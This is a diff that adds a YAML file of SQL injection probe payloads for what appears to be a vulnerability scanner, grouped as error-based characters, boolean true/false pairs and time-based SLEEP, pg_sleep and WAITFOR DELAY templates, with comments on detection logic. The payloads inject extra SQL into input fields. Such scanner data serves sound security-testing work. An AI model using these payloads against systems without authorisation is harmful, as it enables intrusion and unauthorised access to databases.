@@ -1,0 +1,30 @@
+# SQL injection probe payloads (CWE-89).
+# error_based: single special chars that break a naive query if unescaped.
+# boolean_pairs: (true, false) payload pairs compared against the baseline
+#   and against each other -- true should resemble baseline, false should not.
+# time_based: only used serially, on tier-2 candidates, as a last resort.
+#   Each entry is a template with {sleep} substituted with a small integer
+#   (seconds) chosen to be clearly distinguishable from network jitter
+#   without being disruptive.
+
+error_based:
+  - "'"
+  - "\""
+  - "\\"
+  - "')"
+  - "\")"
+
+boolean_pairs:
+  - "true": "' AND '1'='1"
+    "false": "' AND '1'='2"
+  - "true": "1 AND 1=1"
+    "false": "1 AND 1=2"
+  - "true": "' OR '1'='1' -- "
+    "false": "' OR '1'='2' -- "
+
+time_based:
+  - "' AND SLEEP({sleep})-- -"
+  - "' OR SLEEP({sleep})-- -"
+  - "1); SELECT pg_sleep({sleep});--"
+  - "' AND pg_sleep({sleep})-- -"
+  - "'; WAITFOR DELAY '0:0:{sleep}'--"
